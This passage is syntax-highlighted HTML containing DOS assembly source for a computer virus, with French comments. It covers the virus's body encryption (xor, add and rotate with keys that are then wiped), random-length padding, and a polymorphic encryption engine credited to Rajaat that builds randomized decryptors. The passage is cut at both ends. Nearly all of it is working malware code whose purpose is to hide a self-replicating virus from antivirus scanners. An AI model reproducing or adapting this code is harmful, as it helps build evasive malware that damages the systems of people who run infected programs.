    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;passe au bloc suivant</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Block2</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------cryptage NOKEY du corps dans le heap-------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage_NOKEY</span><span class="sc4">-</span><span class="sc5">debut_cryptage_NOKEY</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage_NOKEY</span><span class="sc4">-</span><span class="sc5">debut_cryptage_FSE</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">crypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_xor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_sub</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_ror</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_xor2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypte</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_xor</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;effacement des clefs, au cas ou</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------cryptage FSE du corps dans le heap-------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">debut_cryptage_FSE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">taille_fse</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fse</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---------------ajout d'un nombre d'octet aleatoires a la fin------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">             </span><span class="sc1">;horloge</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;ch=heure, cl=minute, dh=secondes, dl= 1/100 sec</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;=====( Fucking Small Engine - by Rajaat )=====================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; DS:SI = code to encrypt</span><span class="sc0">
</span><span class="sc1">; ES:DI = place for encrypted code + decryptor</span><span class="sc0">
</span><span class="sc1">; CX    = code length to encrypt (add engine length yourself!)</span><span class="sc0">
</span><span class="sc1">; AX    = offset in target</span><span class="sc0">
</span><span class="sc1">;   retour: taille decrypteur+code crypte en cx</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">

</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">fse</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_offset</span><span class="sc0">
</span><span class="sc5">get_offset</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">end_sequencer</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">enc_sequencer</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">len_sequencer</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">com_fse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;if it's a com, do not put a </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">bad_registers</span><span class="sc0">                        </span><span class="sc1">;push cs / pop ds at start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1F0Eh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">bad_registers</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0707</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">bad_registers</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">bad_registers</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">good_pointer</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">bad_registers</span><span class="sc0">
</span><span class="sc5">good_pointer</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">convert_ok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">convert_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer_reg</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b8b8</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">dont_flip</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">dont_flip</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_counter</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1ff</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">no_counter</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_counter</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1ff</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">store</span><span class="sc0">
</span><span class="sc5">is_counter</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">store</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">encrypt_actions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">
</span><span class="sc5">no_more_than_8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1f</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">no_more_than_8</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">enc_opers</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_xor_add_sub</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer_reg</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xor_add_sub</span><span class="sc0">
</span><span class="sc5">no_xor_add_sub</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0bc</span><span class="sc0">      </span><span class="sc1">; was bc</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer_reg</span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">no_bx</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">xor_add_sub</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">dec_opers</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_xas</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">no_xas</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt_actions</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc1">;=== inc/dec pointer and counter</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pointer_first</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">pointer_first</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7078</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc1">;=== building repeat loop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">49</span><span class="sc0">               </span><span class="sc1">;49=opcode de dec cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">75</span><span class="sc0">               </span><span class="sc1">;75=opcode de jne</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_loop</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">;c'est un loop: tuer le dec cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e2</span><span class="sc0">              </span><span class="sc1">;E2=opcode de loop</span><span class="sc0">
</span><span class="sc5">no_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04EBh</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02EBh</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FAEBh</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc1">;=== encrypt code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">enc_sequencer</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt_loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rnd_get</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
